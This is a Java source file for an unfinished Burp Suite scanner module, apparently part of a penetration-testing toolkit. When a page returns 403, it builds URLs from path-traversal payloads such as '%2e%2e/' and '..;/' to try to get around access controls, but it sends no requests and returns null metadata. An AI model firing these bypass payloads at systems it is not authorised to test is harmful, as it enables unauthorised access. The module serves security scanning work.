package burp.scan.active.poc;

import burp.IBurpExtenderCallbacks;
import burp.IResponseInfo;
import burp.scan.active.ModuleBase;
import burp.scan.active.ModuleMeta;
import burp.scan.lib.web.WebPageInfo;
import burp.scan.lib.web.utils.GtSession;
import burp.scan.lib.web.utils.GtURL;

import java.util.Set;

public class ForbiddenBypass implements ModuleBase {
    static String[] Pre_PAYLOADS = {
            "blablabla/%2e%2e/",
            "blablabla/..;/",
            "blablabla/;/",
    };

    static String[] Post_PAYLOADS = {
            "/..;/",
            "?access=1"
    };

    static String[] Header_PAYLOADS = {

    };

    @Override
    public void scan(IBurpExtenderCallbacks callbacks, WebPageInfo webInfo) {
        IResponseInfo responseInfo = webInfo.getRespInfo();
        GtSession request = new GtSession();
        if (responseInfo.getStatusCode() == 403) {
            GtURL url = new GtURL(webInfo.getUrl());
            String file = url.getFile();
            String dirUrl = url.getFileDir();
            for (var payload : Pre_PAYLOADS) {
                var targetUrl = dirUrl + payload + file;

            }
        }
    }

    @Override
    public Set<String> getTags() {
        return null;
    }

    @Override
    public ModuleMeta getMetadata() {
        return null;
    }
}
